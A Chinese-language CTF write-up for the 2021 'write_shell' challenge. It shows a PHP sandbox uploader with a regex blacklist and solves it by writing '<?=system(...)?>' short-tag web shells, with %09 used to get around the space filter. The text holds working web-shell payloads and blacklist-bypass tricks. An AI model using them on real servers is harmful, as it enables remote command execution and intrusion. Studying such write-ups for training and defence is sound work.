# \[红明谷CTF 2021]write\_shell

## \[红明谷CTF 2021]write\_shell

## 考点

* `<?`写shell
* %09绕过空格

## wp

给了代码

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
function check($input){
    if(preg_match("/'| |_|php|;|~|\\^|\\+|eval|{|}/i",$input)){
        // if(preg_match("/'| |_|=|php/",$input)){
        die('hacker!!!');
    }else{
        return $input;
    }
}

function waf($input){
  if(is_array($input)){
      foreach($input as $key=>$output){
          $input[$key] = waf($output);
      }
  }else{
      $input = check($input);
  }
}

$dir = 'sandbox/' . md5($_SERVER['REMOTE_ADDR']) . '/';
if(!file_exists($dir)){
    mkdir($dir);
}
switch($_GET["action"] ?? "") {
    case 'pwd':
        echo $dir;
        break;
    case 'upload':
        $data = $_GET["data"] ?? "";
        waf($data);
        file_put_contents("$dir" . "index.php", $data);
}
?>
```

给了沙盒路径，访问`?action=pwd`就可以看到

![](<../.gitbook/assets/image (6) (1) (1) (1).png>)

然后`?action=upload&data=`是将data写入到沙盒中，访问`sandbox/cc551ab005b2e60fbdc88de809b2c4b1/index.php`就可以看到

要写shell有三种方式，如下

* \<?php
* \<?=要开启short\_open\_tag
* \<script language="php">在PHP7之后就不能用了

在返回头看到PHP版本为7.0，且在check函数中过滤了很多字符

```
/'| |_|php|;|~|\\^|\\+|eval|{|}/i
```

这样就只剩下了`<?=`这种方式，请求`?action=upload&data=%3c%3f%3d123456%3f%3e`，再访问沙盒的index.php，是可以输出123456，过滤了`~`，不能取反绕过。然后构造正常的shell就可以

```
?action=upload&data=<?=system("ls")?>
// 过滤了空格，使用%09绕过
?action=upload&data=<?=system("ls%09/")?>
```

![](<../.gitbook/assets/image (25) (1) (1) (1) (1) (1) (1).png>)

## 小结

1. 这里尝试了无参RCE，发现个很奇怪的东西，在去读请求头的时候，出来个http，`?action=upload&data=<?=end(getallheaders())?>`，不论怎么改请求头都是这个http
